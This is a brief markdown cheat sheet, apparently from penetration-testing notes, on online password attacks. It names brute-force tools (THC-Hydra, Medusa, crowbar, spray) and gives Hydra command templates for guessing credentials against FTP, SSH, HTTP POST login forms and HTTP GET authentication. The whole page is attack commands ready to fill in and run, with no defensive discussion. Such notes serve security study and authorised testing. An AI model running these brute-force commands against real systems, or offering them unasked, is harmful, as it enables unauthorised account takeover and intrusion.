# Online password attacks

[back](readme.md)

## Online attack tools

```text
THC-Hydra || Medusa || crowbar || spray
```

## Hydra

```text
# attacking ftp
hydra -l/L <user> -p/P <pass> ftp://<target>

# attacking ssh
hydra -l/L <user> -p/P <pass> <target> -t 4 ssh

# attacking http post form
hydra -l/L <user> -p/P <pass> <ip> http-post-form "/<path>:username=^USER^&password=^PASS^:F=incorrect" -V

# attacking http get
hydra -l/L <user> -p/P <pass> <ip> http-get /<path>
```